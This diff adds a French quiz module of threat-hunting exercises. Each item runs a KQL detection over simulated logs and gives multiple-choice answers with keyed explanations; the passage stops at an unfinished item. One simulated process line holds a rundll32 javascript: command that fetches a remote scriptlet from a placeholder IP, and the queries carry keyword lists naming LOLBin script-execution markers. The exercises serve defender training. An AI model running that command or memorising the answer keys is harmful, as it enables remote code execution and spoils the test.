@@ -1,0 +1,561 @@
+@@ module=3
+
+### Pulvérisation dans des journaux simulés
+@ niveau=I sub=hunt ref=kql-datatable,kql-dcount
+?: **Hypothèse de chasse :** une source pratique la pulvérisation de mots de passe. On exécute la requête suivante sur un extrait simulé de journaux de connexion. Quelle adresse IP ressort ?
+```kql
+let Connexions = datatable(TimeGenerated:datetime, UserPrincipalName:string, IPAddress:string, ResultType:string)
+[
+    datetime(2026-10-05T02:00:00Z), "a.martin@contoso.com", "203.0.113.10", "50126",
+    datetime(2026-10-05T02:00:05Z), "b.leroy@contoso.com",  "203.0.113.10", "50126",
+    datetime(2026-10-05T02:00:09Z), "c.dubois@contoso.com", "203.0.113.10", "50126",
+    datetime(2026-10-05T02:00:14Z), "d.moreau@contoso.com", "203.0.113.10", "50126",
+    datetime(2026-10-05T09:12:00Z), "e.petit@contoso.com",  "198.51.100.7", "50126",
+    datetime(2026-10-05T09:12:30Z), "e.petit@contoso.com",  "198.51.100.7", "50126",
+    datetime(2026-10-05T09:13:10Z), "e.petit@contoso.com",  "198.51.100.7", "0"
+];
+Connexions
+| where ResultType == "50126"
+| summarize Comptes = dcount(UserPrincipalName), Echecs = count() by IPAddress
+| where Comptes >= 3
+```
++: 203.0.113.10, avec 4 comptes distincts en échec en quelques secondes.
+-: 198.51.100.7, car elle a obtenu un succès. || Elle n'a ciblé qu'un compte (2 échecs puis succès) : profil d'erreur de saisie, pas de pulvérisation, et elle ne passe pas le filtre `Comptes >= 3`.
+-: Les deux adresses IP. || 198.51.100.7 n'atteint qu'un compte distinct.
+-: Aucune, car la requête ne filtre pas sur le temps. || Le jeu simulé est déjà borné ; la logique dcount suffit à isoler la source.
+=: Le filtre conserve les échecs « identifiants invalides » (50126), puis `dcount(UserPrincipalName)` par IP mesure l'étendue : **203.0.113.10** a testé **4 comptes** en 14 secondes (Comptes = 4, Echecs = 4), signature de pulvérisation (T1110.003).
+T: **datatable** permet de construire des journaux simulés pour tester une logique de chasse ou une règle avant déploiement, sans dépendre des données réelles. Sur des données réelles, ajouter une fenêtre temporelle (`bin(TimeGenerated, 1h)`) et vérifier les succès éventuels depuis la même IP.
+R: Une ligne : IPAddress = 203.0.113.10, Comptes = 4, Echecs = 4.
+S: Les codes ResultType de SigninLogs sont des chaînes ; 50126 = nom d'utilisateur ou mot de passe incorrect.
+M: Ajouter `countif(ResultType == "0")` dans le même `summarize` pour détecter une pulvérisation réussie.
+!: Pulvérisation = beaucoup de comptes distincts par IP (dcount), peu d'essais par compte.
+
+### Balisage de commande et contrôle
+@ niveau=A sub=hunt ref=kql-prev,kql-serialize
+?: **Hypothèse de chasse :** un implant contacte son serveur à intervalle régulier. Sur les connexions simulées suivantes, que conclut la requête pour le couple (PC-17, 198.51.100.23) ?
+```kql
+let Reseau = datatable(TimeGenerated:datetime, DeviceName:string, RemoteIP:string)
+[
+    datetime(2026-10-05T10:00:00Z), "PC-17", "198.51.100.23",
+    datetime(2026-10-05T10:05:02Z), "PC-17", "198.51.100.23",
+    datetime(2026-10-05T10:09:58Z), "PC-17", "198.51.100.23",
+    datetime(2026-10-05T10:15:01Z), "PC-17", "198.51.100.23",
+    datetime(2026-10-05T10:20:00Z), "PC-17", "198.51.100.23",
+    datetime(2026-10-05T10:01:00Z), "PC-22", "203.0.113.80",
+    datetime(2026-10-05T10:47:00Z), "PC-22", "203.0.113.80"
+];
+Reseau
+| sort by DeviceName asc, RemoteIP asc, TimeGenerated asc
+| extend Intervalle = iff(DeviceName == prev(DeviceName) and RemoteIP == prev(RemoteIP), (TimeGenerated - prev(TimeGenerated)) / 1s, real(null))
+| where isnotnull(Intervalle)
+| summarize Connexions = count() + 1, Moyenne = avg(Intervalle), EcartType = stdev(Intervalle) by DeviceName, RemoteIP
+| where Connexions >= 5 and EcartType < 10
+```
++: Le couple est signalé : 5 connexions espacées d'environ 300 secondes avec un écart-type de quelques secondes, ce qui évoque un balisage automatisé.
+-: Le couple n'est pas signalé car il n'y a que 5 connexions. || Le seuil est `>= 5` : 5 connexions passent le filtre.
+-: PC-22 est signalé car son intervalle est plus long. || PC-22 n'a que 2 connexions et un seul intervalle (46 min) : il ne passe pas `Connexions >= 5`.
+-: La requête échoue car `prev()` exige `serialize`. || `sort by` sérialise déjà le jeu de lignes.
+=: Après tri, `prev()` compare chaque ligne à la précédente du même couple (appareil, IP) ; les intervalles de PC-17 valent environ 302, 296, 303 et 299 secondes : **moyenne ≈ 300 s**, **écart-type ≈ 3 s** → régularité typique d'un **beaconing** (T1071).
+T: La division d'un timespan par `1s` donne un nombre de secondes. Les implants ajoutent souvent une **gigue** (jitter) de 10 à 30 % : ajuster le seuil d'écart-type ou utiliser le coefficient de variation (EcartType / Moyenne). Exclure les services légitimes réguliers (mises à jour, télémétrie, NTP).
+R: Une ligne : PC-17, 198.51.100.23, Connexions = 5, Moyenne ≈ 300, EcartType ≈ 3.
+S: Sur DeviceNetworkEvents réel, certaines connexions peuvent être échantillonnées : tolérer des valeurs manquantes.
+M: Enrichir avec la rareté de l'IP dans l'organisation (`dcount(DeviceName)` par RemoteIP) : une IP contactée par un seul appareil et à intervalle régulier est très suspecte.
+!: Balisage = intervalles réguliers (écart-type faible) vers une même destination, peu partagée.
+
+### Voyage impossible calculé
+@ niveau=A sub=hunt ref=kql-datetime-diff,kql-geo
+?: **Hypothèse de chasse :** un compte est utilisé simultanément depuis deux pays. Que renvoie la requête sur ces connexions simulées ?
+```kql
+let Connexions = datatable(TimeGenerated:datetime, UserPrincipalName:string, Location:string, IPAddress:string)
+[
+    datetime(2026-10-05T08:00:00Z), "c.dubois@contoso.com", "FR", "192.0.2.10",
+    datetime(2026-10-05T08:40:00Z), "c.dubois@contoso.com", "SG", "203.0.113.200",
+    datetime(2026-10-05T09:00:00Z), "a.martin@contoso.com", "FR", "192.0.2.11",
+    datetime(2026-10-05T18:00:00Z), "a.martin@contoso.com", "DE", "198.51.100.40"
+];
+Connexions
+| sort by UserPrincipalName asc, TimeGenerated asc
+| extend PaysPrec = prev(Location), TempsPrec = prev(TimeGenerated), UtilPrec = prev(UserPrincipalName)
+| where UserPrincipalName == UtilPrec and Location != PaysPrec
+| extend Minutes = datetime_diff("minute", TimeGenerated, TempsPrec)
+| where Minutes < 120
+| project UserPrincipalName, PaysPrec, Location, Minutes
+```
++: Une ligne pour c.dubois@contoso.com : passage de FR à SG en 40 minutes.
+-: Une ligne pour a.martin@contoso.com : passage de FR à DE. || L'écart est de 540 minutes (9 h), compatible avec un déplacement : il ne passe pas le filtre `Minutes < 120`.
+-: Deux lignes, une par utilisateur. || Seul le changement de pays de c.dubois est inférieur à 120 minutes.
+-: Aucune ligne, car `prev()` mélange les utilisateurs. || La condition `UserPrincipalName == UtilPrec` empêche de comparer deux utilisateurs différents.
+=: **datetime_diff("minute", t2, t1)** calcule l'écart en minutes. Un changement de pays FR → SG en **40 minutes** est physiquement impossible : signe d'une session volée, d'un VPN ou d'un proxy à vérifier.
+T: Les détections natives (Entra ID Protection « Atypical travel », MDCA « Impossible travel ») tiennent compte de l'historique et des VPN connus. Une requête personnalisée peut utiliser `geo_info_from_ip_address()` et les coordonnées pour calculer une vitesse (`geo_distance_2points`).
+R: c.dubois@contoso.com | FR | SG | 40.
+M: Exclure les IP de VPN d'entreprise (watchlist) et ne garder que les connexions réussies.
+!: Changement de pays + faible délai (datetime_diff) = voyage impossible à investiguer.
+
+### Lignée de processus rare
+@ niveau=I sub=hunt ref=kql-summarize,kql-dcount
+?: **Hypothèse de chasse :** les couples parent → enfant rares dans le parc méritent une analyse. Sur les données simulées, quel couple est mis en évidence ?
+```kql
+let Processus = datatable(DeviceName:string, Parent:string, Enfant:string)
+[
+    "PC-01", "explorer.exe", "chrome.exe",
+    "PC-02", "explorer.exe", "chrome.exe",
+    "PC-03", "explorer.exe", "chrome.exe",
+    "PC-04", "explorer.exe", "outlook.exe",
+    "PC-05", "explorer.exe", "outlook.exe",
+    "PC-06", "excel.exe", "powershell.exe",
+    "PC-01", "services.exe", "svchost.exe",
+    "PC-02", "services.exe", "svchost.exe"
+];
+Processus
+| summarize Appareils = dcount(DeviceName) by Parent, Enfant
+| where Appareils == 1
+```
++: excel.exe → powershell.exe, observé sur un seul appareil (PC-06).
+-: explorer.exe → chrome.exe. || Observé sur 3 appareils : couple courant.
+-: services.exe → svchost.exe. || Observé sur 2 appareils et légitime.
+-: explorer.exe → outlook.exe. || Observé sur 2 appareils.
+=: L'analyse de **prévalence** (« long tail », moindre fréquence) compte le nombre d'appareils par couple parent → enfant ; les couples présents sur un seul appareil sont rares. Ici, **Excel lançant PowerShell** est à la fois rare et caractéristique d'une macro malveillante (T1204.002 + T1059.001).
+T: Sur des données réelles (DeviceProcessEvents), utiliser `InitiatingProcessFileName` et `FileName`, et une fenêtre de 7 à 30 jours. La rareté ne suffit pas : croiser avec la nature du couple (Office → interpréteur, services → cmd…) et la signature des binaires.
+R: Une ligne : excel.exe | powershell.exe | 1.
+M: Ajouter `make_set(DeviceName)` pour lister directement les appareils concernés et `FileProfile()` pour la prévalence mondiale des binaires.
+!: Chasse « long tail » = prévalence faible (dcount d'appareils) + contexte suspect.
+
+### Exfiltration hors norme par utilisateur
+@ niveau=A sub=hunt ref=kql-summarize,kql-percentile
+?: **Hypothèse de chasse :** un utilisateur télécharge beaucoup plus que d'habitude. Sur ces données simulées (Mo téléchargés par jour), quel utilisateur dépasse trois fois sa moyenne historique ?
+```kql
+let Volumes = datatable(Jour:datetime, Utilisateur:string, Mo:real)
+[
+    datetime(2026-10-01), "lucas", 120.0, datetime(2026-10-02), "lucas", 100.0, datetime(2026-10-03), "lucas", 140.0, datetime(2026-10-04), "lucas", 130.0,
+    datetime(2026-10-01), "emma", 300.0,  datetime(2026-10-02), "emma", 280.0,  datetime(2026-10-03), "emma", 320.0,  datetime(2026-10-04), "emma", 2900.0
+];
+let Historique = Volumes | where Jour < datetime(2026-10-04) | summarize Moyenne = avg(Mo) by Utilisateur;
+Volumes
+| where Jour == datetime(2026-10-04)
+| join kind=inner Historique on Utilisateur
+| where Mo > 3 * Moyenne
+| project Utilisateur, Mo, Moyenne
+```
++: emma : 2 900 Mo le 4 octobre contre une moyenne historique de 300 Mo.
+-: lucas : 130 Mo le 4 octobre. || Sa moyenne historique est 120 Mo : 130 Mo n'atteint pas 3 × 120.
+-: Les deux utilisateurs. || Seule emma dépasse le seuil.
+-: Aucun, car la jointure supprime toutes les lignes. || La clé Utilisateur existe des deux côtés.
+=: On calcule une **référence par utilisateur** (moyenne avant le jour analysé), puis on compare le jour cible : emma (2 900 Mo) dépasse largement 3 × 300 = 900 Mo. Une comparaison **relative à l'individu** évite de signaler les gros consommateurs habituels.
+T: Pour des données réelles : CloudAppEvents (FileDownloaded), OfficeActivity, journaux de proxy (SentBytes/ReceivedBytes), StorageBlobLogs. Les fonctions `percentile()` ou `series_decompose_anomalies()` donnent des références plus robustes que la moyenne.
+R: emma | 2900 | 300.
+M: Croiser avec IdentityInfo (départ prévu, changement de service) et les alertes Insider Risk Management.
+!: Exfiltration : comparer à la référence de chaque utilisateur, pas à un seuil global.
+
+### Mouvement latéral en éventail
+@ niveau=I sub=hunt ref=kql-dcount,xdr-t-DeviceLogonEvents
+?: **Hypothèse de chasse :** un compte compromis se connecte rapidement à de nombreux serveurs. Que renvoie la requête sur les ouvertures de session réseau simulées ?
+```kql
+let Logons = datatable(TimeGenerated:datetime, AccountName:string, DeviceName:string, LogonType:string)
+[
+    datetime(2026-10-05T13:00:00Z), "svc_sql", "SRV-SQL01", "Network",
+    datetime(2026-10-05T13:02:00Z), "j.roux",  "SRV-FIC01", "Network",
+    datetime(2026-10-05T13:02:30Z), "j.roux",  "SRV-FIC02", "Network",
+    datetime(2026-10-05T13:03:10Z), "j.roux",  "SRV-APP01", "Network",
+    datetime(2026-10-05T13:03:40Z), "j.roux",  "SRV-APP02", "Network",
+    datetime(2026-10-05T13:04:05Z), "j.roux",  "SRV-DC01",  "Network",
+    datetime(2026-10-05T15:00:00Z), "svc_sql", "SRV-SQL01", "Network"
+];
+Logons
+| summarize Cibles = dcount(DeviceName), Liste = make_set(DeviceName) by AccountName, bin(TimeGenerated, 10m)
+| where Cibles >= 4
+```
++: Le compte j.roux, qui s'est connecté à 5 serveurs différents (dont un contrôleur de domaine) en un peu plus de 2 minutes.
+-: Le compte svc_sql, qui se connecte deux fois au même serveur. || Une seule cible distincte : activité de service régulière.
+-: Aucun compte, car LogonType « Network » est légitime. || Le type est courant, c'est l'éventail de cibles en peu de temps qui est anormal.
+-: Les deux comptes. || svc_sql ne dépasse pas le seuil de 4 cibles distinctes.
+=: Le **nombre de cibles distinctes** par compte et par fenêtre de 10 minutes révèle un **mouvement latéral en éventail** (T1021, outils comme PsExec, WMI, SMB). j.roux touche 5 serveurs, dont **SRV-DC01**, en 2 minutes.
+T: Sur des données réelles : DeviceLogonEvents (LogonType Network/RemoteInteractive), IdentityLogonEvents (vu par les DC) ou SecurityEvent 4624 type 3. Exclure les comptes d'administration et de supervision connus (scanners, sauvegarde). MDI fournit aussi des alertes de mouvement latéral.
+R: j.roux | 2026-10-05T13:00 | 5 | [SRV-FIC01, SRV-FIC02, SRV-APP01, SRV-APP02, SRV-DC01].
+M: Ajouter `IsLocalAdmin` (DeviceLogonEvents) et prioriser lorsque des contrôleurs de domaine figurent dans la liste.
+!: Mouvement latéral = dcount(cibles) élevé par compte sur une fenêtre courte.
+
+### Renommage massif de fichiers (rançongiciel)
+@ niveau=A sub=hunt ref=kql-summarize,xdr-t-DeviceFileEvents
+?: **Hypothèse de chasse :** un rançongiciel chiffre et renomme les fichiers avec une nouvelle extension. Sur les événements simulés, quel appareil et quelle extension la requête signale-t-elle ?
+```kql
+let Fichiers = datatable(TimeGenerated:datetime, DeviceName:string, ActionType:string, FileName:string, PreviousFileName:string)
+[
+    datetime(2026-10-05T22:00:01Z), "SRV-FIC01", "FileRenamed", "budget.xlsx.lockx", "budget.xlsx",
+    datetime(2026-10-05T22:00:01Z), "SRV-FIC01", "FileRenamed", "rh.docx.lockx", "rh.docx",
+    datetime(2026-10-05T22:00:02Z), "SRV-FIC01", "FileRenamed", "plan.pdf.lockx", "plan.pdf",
+    datetime(2026-10-05T22:00:02Z), "SRV-FIC01", "FileRenamed", "photo.jpg.lockx", "photo.jpg",
+    datetime(2026-10-05T22:00:03Z), "SRV-FIC01", "FileRenamed", "contrat.docx.lockx", "contrat.docx",
+    datetime(2026-10-05T09:15:00Z), "PC-08", "FileRenamed", "rapport_v2.docx", "rapport.docx"
+];
+Fichiers
+| where ActionType == "FileRenamed"
+| extend NouvelleExt = tostring(split(FileName, ".")[-1]), AncienneExt = tostring(split(PreviousFileName, ".")[-1])
+| where NouvelleExt != AncienneExt
+| summarize Fichiers = count() by DeviceName, NouvelleExt, bin(TimeGenerated, 1m)
+| where Fichiers >= 5
+```
++: SRV-FIC01 avec l'extension « lockx » : 5 fichiers renommés en moins d'une minute.
+-: PC-08 avec l'extension « docx ». || L'extension ne change pas (docx → docx) et un seul fichier est concerné.
+-: SRV-FIC01 avec l'extension « xlsx ». || « xlsx » est l'ancienne extension ; la nouvelle est « lockx ».
+-: Aucun appareil, car `split()` renvoie une chaîne. || `split()` renvoie un tableau ; l'index `[-1]` prend le dernier élément.
+=: **split(texte, ".")** renvoie un tableau ; **[-1]** désigne son dernier élément (l'extension). Un grand nombre de renommages vers une **nouvelle extension commune** en très peu de temps est la signature d'un chiffrement par rançongiciel (T1486).
+T: MDE détecte nativement ce comportement (alertes rançongiciel) et l'accès contrôlé aux dossiers peut le bloquer. Sur des données réelles (DeviceFileEvents), regarder aussi le processus initiateur et la création de notes de rançon (`*.txt` identiques dans de nombreux dossiers).
+R: SRV-FIC01 | lockx | 2026-10-05T22:00 | 5.
+M: Ajouter `InitiatingProcessFileName` et `InitiatingProcessAccountName` dans le regroupement pour identifier le processus chiffreur et lancer l'isolement automatique.
+!: Rançongiciel = renommages massifs vers une extension commune en peu de temps (split()[-1]).
+
+### Kerberoasting dans des événements 4769
+@ niveau=A sub=hunt ref=la-t-SecurityEvent,mdi-alerts
+?: **Hypothèse de chasse :** un compte demande des tickets de service RC4 pour de nombreux SPN. Que renvoie la requête sur les événements simulés ?
+```kql
+let Tickets = datatable(TimeGenerated:datetime, TargetUserName:string, ServiceName:string, TicketEncryptionType:string)
+[
+    datetime(2026-10-05T11:00:00Z), "m.blanc@CONTOSO.LOCAL", "MSSQLSvc-sql01", "0x17",
+    datetime(2026-10-05T11:00:01Z), "m.blanc@CONTOSO.LOCAL", "HTTP-web01",     "0x17",
+    datetime(2026-10-05T11:00:01Z), "m.blanc@CONTOSO.LOCAL", "svc_backup",     "0x17",
+    datetime(2026-10-05T11:00:02Z), "m.blanc@CONTOSO.LOCAL", "svc_report",     "0x17",
+    datetime(2026-10-05T11:00:02Z), "m.blanc@CONTOSO.LOCAL", "svc_crm",        "0x17",
+    datetime(2026-10-05T11:30:00Z), "p.henry@CONTOSO.LOCAL", "HTTP-web01",     "0x12"
+];
+Tickets
+| where TicketEncryptionType == "0x17"
+| summarize Services = dcount(ServiceName), Liste = make_set(ServiceName) by TargetUserName, bin(TimeGenerated, 5m)
+| where Services >= 5
+```
++: m.blanc@CONTOSO.LOCAL, qui a demandé en 2 secondes des tickets RC4 (0x17) pour 5 services différents.
+-: p.henry@CONTOSO.LOCAL. || Un seul ticket, chiffré en AES256 (0x12) : comportement normal.
+-: Les deux comptes. || p.henry est exclu par le filtre sur le type de chiffrement et le seuil.
+-: Aucun, car 0x17 correspond à AES. || 0x17 correspond à RC4-HMAC ; 0x11/0x12 sont AES128/AES256.
+=: Dans l'événement **4769**, `TicketEncryptionType = 0x17` indique **RC4-HMAC**, type privilégié par les attaquants car plus rapide à casser hors ligne. De nombreuses demandes RC4 pour des services distincts en quelques secondes signent un **Kerberoasting** (T1558.003).
+T: Dans SecurityEvent réel, les champs de 4769 se trouvent dans EventData selon la collecte ; sur un environnement AES-only, les demandes RC4 sont d'autant plus suspectes. MDI fournit des alertes natives de reconnaissance SPN/Kerberoasting.
+R: m.blanc@CONTOSO.LOCAL | 11:00 | 5 | [MSSQLSvc-sql01, HTTP-web01, svc_backup, svc_report, svc_crm].
+S: Le jeu simulé expose TicketEncryptionType comme colonne ; dans SecurityEvent réel, ce champ peut devoir être extrait de EventData selon le schéma de collecte.
+M: Exclure les comptes machine (se terminant par $) et les services n'acceptant que RC4 documentés.
+!: Kerberoasting = 4769 RC4 (0x17) massifs pour des SPN distincts par un même compte.
+
+### Exécution de JavaScript via rundll32
+@ niveau=I sub=hunt ref=kql-has,xdr-t-DeviceProcessEvents
+?: **Hypothèse de chasse :** des binaires système sont détournés pour exécuter du script (T1218). Quelle ligne simulée est signalée par la requête ?
+```kql
+let Proc = datatable(DeviceName:string, FileName:string, ProcessCommandLine:string)
+[
+    "PC-31", "rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
+    "PC-44", "rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://198.51.100.9/a.sct\")",
+    "PC-12", "mshta.exe",    "mshta.exe C:\\Program Files\\App\\aide.hta"
+];
+Proc
+| where FileName in~ ("rundll32.exe", "mshta.exe", "regsvr32.exe")
+| where ProcessCommandLine has_any ("javascript:", "vbscript:", "script:http", "RunHTMLApplication")
+| project DeviceName, FileName, ProcessCommandLine
+```
++: La ligne de PC-44 : rundll32.exe exécutant du JavaScript via mshtml et chargeant un scriptlet distant.
+-: La ligne de PC-31 : rundll32 ouvrant un panneau de configuration. || Usage légitime (Control_RunDLL d'un fichier .cpl), sans terme recherché.
+-: La ligne de PC-12 : mshta lançant une aide HTA locale. || Aucun des termes recherchés n'apparaît ; à surveiller, mais non retenu par cette requête.
+-: Les trois lignes, car les trois binaires sont des LOLBins. || Le second filtre exige un indicateur d'exécution de script.
+=: **rundll32 javascript:...RunHTMLApplication** et **GetObject("script:http...")** sont des techniques de proxy d'exécution (T1218.011) permettant de lancer du code script sans fichier sur disque et de télécharger des scriptlets (.sct).
+T: `has_any` gère plusieurs indicateurs ; les antislashs et guillemets du jeu simulé sont échappés dans la datatable. Des règles ASR et la protection réseau complètent la défense. MDE dispose d'alertes natives pour ces abus de binaires signés.
+R: PC-44 | rundll32.exe | (ligne de commande malveillante).
+M: Ajouter regsvr32 `/i:http` (Squiblydoo, T1218.010) et mshta avec URL distante (T1218.005).
+!: LOLBins (rundll32, mshta, regsvr32) + javascript:/script:http = exécution détournée (T1218).
+
+### Tunnel DNS par longueur de sous-domaine
+@ niveau=A sub=hunt ref=kql-split,kql-summarize
+?: **Hypothèse de chasse :** des données sont exfiltrées par des requêtes DNS à longs sous-domaines. Sur les requêtes simulées, quel domaine est signalé ?
+```kql
+let Dns = datatable(TimeGenerated:datetime, ClientIP:string, Name:string)
+[
+    datetime(2026-10-05T10:00:00Z), "10.0.4.25", "4a6f75726e616c2d636f6d707461626c652d32303236.x7.exfil-data.net",
+    datetime(2026-10-05T10:00:01Z), "10.0.4.25", "6d6f74732d64652d70617373652d61646d696e2d7631.x8.exfil-data.net",
+    datetime(2026-10-05T10:00:02Z), "10.0.4.25", "636c69656e74732d7072656d69756d2d6c697374652d.x9.exfil-data.net",
+    datetime(2026-10-05T10:05:00Z), "10.0.4.30", "www.contoso.com",
+    datetime(2026-10-05T10:06:00Z), "10.0.4.31", "login.microsoftonline.com"
+];
+Dns
+| extend Parties = split(Name, ".")
+| extend Domaine = strcat(tostring(Parties[-2]), ".", tostring(Parties[-1])), LongueurSousDomaine = strlen(tostring(Parties[0]))
+| summarize Requetes = count(), LongueurMoy = avg(LongueurSousDomaine), SousDomaines = dcount(Name) by ClientIP, Domaine
+| where LongueurMoy > 30 and SousDomaines >= 3
+```
++: exfil-data.net, interrogé par 10.0.4.25 avec des sous-domaines d'environ 44 caractères, tous différents.
+-: contoso.com. || Sous-domaine court (« www ») et une seule requête.
+-: microsoftonline.com. || Sous-domaine court (« login ») et une seule requête.
+-: Aucun, car `split` ne fonctionne pas sur les noms de domaine. || `split` découpe toute chaîne selon le séparateur.
+=: Le **tunnel DNS** (T1071.004, T1048) encode des données dans les sous-domaines : labels longs (ici des chaînes hexadécimales de 44 caractères), forte cardinalité de noms uniques et un même domaine parent. La requête extrait le domaine enregistré (deux derniers labels) et la longueur du premier label.
+T: Sur des données réelles : DnsEvents (serveurs DNS Windows), journaux DNS d'Azure Firewall, DeviceEvents (DnsQueryResponse), ASIM `_Im_Dns`. Le calcul « deux derniers labels » est approximatif pour les suffixes comme .co.uk : utiliser une liste de suffixes publics si besoin. Le décodage hexadécimal des labels révèle souvent le contenu exfiltré (ici « Journal-comptable-2026 »…).
+R: 10.0.4.25 | exfil-data.net | 3 | ≈ 44 | 3.
+M: Ajouter un calcul d'entropie ou la proportion de caractères hexadécimaux, et la rareté du domaine dans l'organisation.
+!: Tunnel DNS = sous-domaines longs et uniques vers un même domaine parent.
+
+### Règle de boîte de réception de dissimulation
+@ niveau=I sub=hunt ref=la-t-OfficeActivity,kql-has
+?: **Hypothèse de chasse :** un attaquant masque des réponses de la victime en déplaçant certains messages vers un dossier peu consulté. Quelle règle simulée est signalée ?
+```kql
+let Regles = datatable(TimeGenerated:datetime, UserId:string, Operation:string, Parameters:string)
+[
+    datetime(2026-10-05T07:10:00Z), "f.garnier@contoso.com", "New-InboxRule", "Name=Factures;From=compta@fournisseur.fr;MoveToFolder=Factures",
+    datetime(2026-10-05T07:12:00Z), "s.lambert@contoso.com", "New-InboxRule", "Name=..;SubjectContainsWords=virement,facture,RIB;MoveToFolder=RSS Feeds;MarkAsRead=True",
+    datetime(2026-10-05T08:00:00Z), "t.noel@contoso.com",    "Set-Mailbox",   "AutoReplyState=Enabled"
+];
+Regles
+| where Operation in ("New-InboxRule", "Set-InboxRule")
+| where Parameters has_any ("RSS Feeds", "Conversation History", "DeleteMessage", "MarkAsRead=True")
+| project TimeGenerated, UserId, Parameters
+```
++: La règle de s.lambert : nom « .. », mots-clés financiers, déplacement vers « RSS Feeds » et marquage comme lu.
+-: La règle de f.garnier : classement des factures d'un fournisseur. || Règle métier plausible, sans indicateur de dissimulation.
+-: L'opération de t.noel : réponse automatique. || Ce n'est pas une règle de boîte de réception et elle n'est pas filtrée.
+-: Les trois opérations. || Seule une opération remplit les deux conditions.
+=: Les règles malveillantes de **dissimulation** (T1564.008) ont des noms courts ou absurdes (« .. », « . »), ciblent des mots-clés financiers et déplacent les messages vers des dossiers rarement consultés (**RSS Feeds**, **Conversation History**, Archive) ou les suppriment/marquent comme lus — typique de la fraude au virement (BEC).
+T: Les paramètres réels de OfficeActivity sont au format JSON (tableau Name/Value) : `has_any` fonctionne aussi bien sur ce texte. MDCA détecte « Suspicious inbox manipulation rule ». Réponse : supprimer la règle, réinitialiser l'accès, rechercher les échanges financiers interceptés.
+R: s.lambert@contoso.com avec les paramètres de la règle.
+M: Ajouter la détection de règles sans nom ou d'un seul caractère via `extract(@"Name=([^;]*)", 1, Parameters)`.
+!: Règle cachée = nom court + mots-clés financiers + RSS Feeds / suppression / lu.
+
+### Effacement de journaux et arrêt de service
+@ niveau=I sub=hunt ref=kql-in,la-t-SecurityEvent
+?: **Hypothèse de chasse :** un attaquant efface ses traces avant de quitter un serveur. Sur ces événements simulés, quel serveur présente la séquence « arrêt de l'audit puis effacement » ?
+```kql
+let Evts = datatable(TimeGenerated:datetime, Computer:string, EventID:int, Account:string)
+[
+    datetime(2026-10-05T03:10:00Z), "SRV-APP02", 4719, "CONTOSO\\adm_tmp",
+    datetime(2026-10-05T03:11:30Z), "SRV-APP02", 1102, "CONTOSO\\adm_tmp",
+    datetime(2026-10-05T10:00:00Z), "SRV-SQL01", 4624, "CONTOSO\\svc_sql",
+    datetime(2026-10-05T11:00:00Z), "SRV-FIC01", 1102, "CONTOSO\\admin.it"
+];
+Evts
+| where EventID in (4719, 1102)
+| summarize Evenements = make_set(EventID), Debut = min(TimeGenerated), Fin = max(TimeGenerated) by Computer, Account
+| where set_has_element(Evenements, 4719) and set_has_element(Evenements, 1102)
+```
++: SRV-APP02, avec modification de la stratégie d'audit (4719) puis effacement du journal (1102) par CONTOSO\adm_tmp en 90 secondes.
+-: SRV-FIC01. || Un effacement isolé (1102) par un administrateur : à vérifier, mais la séquence complète n'y figure pas.
+-: SRV-SQL01. || 4624 est une ouverture de session réussie ordinaire.
+-: Aucun serveur, car `set_has_element` n'accepte pas d'entiers. || La fonction teste l'appartenance de toute valeur scalaire.
+=: La combinaison **4719** (stratégie d'audit modifiée) + **1102** (journal effacé) par un même compte sur un même serveur, en quelques minutes, constitue une séquence anti-forensique forte (T1562.002 + T1070.001). `make_set` + `set_has_element` vérifie la présence des deux événements.
+T: Même si l'attaquant efface le journal local, les événements déjà **collectés par AMA** sont conservés dans Sentinel : c'est un intérêt majeur de la centralisation. Un compte « adm_tmp » mérite une vérification de création récente (4720).
+R: SRV-APP02 | CONTOSO\adm_tmp | [4719, 1102] | 03:10 | 03:11:30.
+M: Corréler avec la création du compte (4720) et l'arrêt de l'agent (absence de Heartbeat).
+!: 4719 puis 1102 par le même compte = effacement de traces ; la centralisation SIEM préserve les preuves.
+
+### Ajout puis retrait rapide d'un administrateur
+@ niveau=A sub=hunt ref=la-t-SecurityEvent,kql-datetime-diff
+?: **Hypothèse de chasse :** un attaquant s'ajoute brièvement au groupe Admins du domaine pour agir puis se retire. Que renvoie la requête sur ces événements simulés ?
+```kql
+let Groupes = datatable(TimeGenerated:datetime, EventID:int, MemberName:string, TargetUserName:string)
+[
+    datetime(2026-10-05T01:00:00Z), 4728, "CN=helpdesk02,OU=IT,DC=contoso,DC=local", "Domain Admins",
+    datetime(2026-10-05T01:14:00Z), 4729, "CN=helpdesk02,OU=IT,DC=contoso,DC=local", "Domain Admins",
+    datetime(2026-10-03T09:00:00Z), 4728, "CN=admin.paul,OU=IT,DC=contoso,DC=local", "Domain Admins"
+];
+let Ajouts = Groupes | where EventID == 4728 | project Ajout = TimeGenerated, MemberName, TargetUserName;
+let Retraits = Groupes | where EventID == 4729 | project Retrait = TimeGenerated, MemberName, TargetUserName;
+Ajouts
+| join kind=inner Retraits on MemberName, TargetUserName
+| extend DureeMinutes = datetime_diff("minute", Retrait, Ajout)
+| where DureeMinutes between (0 .. 60)
+| project MemberName, TargetUserName, Ajout, Retrait, DureeMinutes
+```
++: helpdesk02, ajouté au groupe Domain Admins puis retiré 14 minutes plus tard.
+-: admin.paul. || Ajouté sans retrait : il n'apparaît pas dans la jointure avec les retraits.
+-: Les deux comptes. || Seul helpdesk02 possède un ajout et un retrait rapprochés.
+-: Aucun, car 4729 n'existe pas. || 4729 correspond au retrait d'un membre d'un groupe global de sécurité.
+=: **4728** (membre ajouté à un groupe global) et **4729** (membre retiré) rapprochés de quelques minutes pour un groupe à privilèges révèlent une **élévation temporaire** destinée à agir sans laisser d'appartenance durable (T1098).
+T: Les groupes universels utilisent 4756/4757 et les groupes locaux 4732/4733. Defender for Identity détecte aussi les modifications de groupes sensibles (IdentityDirectoryEvents). Investiguer ce que le compte a fait pendant la fenêtre (connexions aux DC, modifications de GPO, DCSync).
+R: helpdesk02 | Domain Admins | 01:00 | 01:14 | 14.
+M: Étendre aux groupes Enterprise Admins, Schema Admins, Administrators et aux rôles Entra (AuditLogs « Add member to role » / « Remove member from role »).
+!: Ajout puis retrait rapide d'un groupe sensible = élévation temporaire à investiguer.
+
+### Activité administrative hors heures ouvrées
+@ niveau=D sub=hunt ref=kql-hourofday,kql-dayofweek
+?: **Hypothèse de chasse :** des opérations Azure sensibles ont lieu la nuit ou le week-end. Quelles opérations simulées sont retenues ?
+```kql
